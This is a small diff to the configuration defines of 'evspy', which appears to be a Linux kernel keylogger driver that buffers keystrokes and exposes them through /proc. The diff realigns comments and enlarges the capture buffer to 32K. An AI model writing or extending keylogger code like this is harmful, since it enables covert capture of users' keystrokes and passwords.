@@ -41,10 +41,10 @@
 #define EVS_KLAY_EN		0
 #define EVS_KLAY_ES		1
 
-#define EVS_NAME		"evspy"				// driver name
-#define EVS_KLAY		EVS_KLAY_ES			// change this to your keyboard layout
-#define EVS_TROLL		1					// clear this if you're a serious guy
-#define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
+#define EVS_NAME		"evspy"			// driver name
+#define EVS_KLAY		EVS_KLAY_ES		// change this to your keyboard layout
+#define EVS_TROLL		1				// clear this if you're a serious guy
+#define EVS_BUFSIZE		(1<<15) // 32K	// size of the circular buffer
 #define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
 
 #include "maps/maps.h"
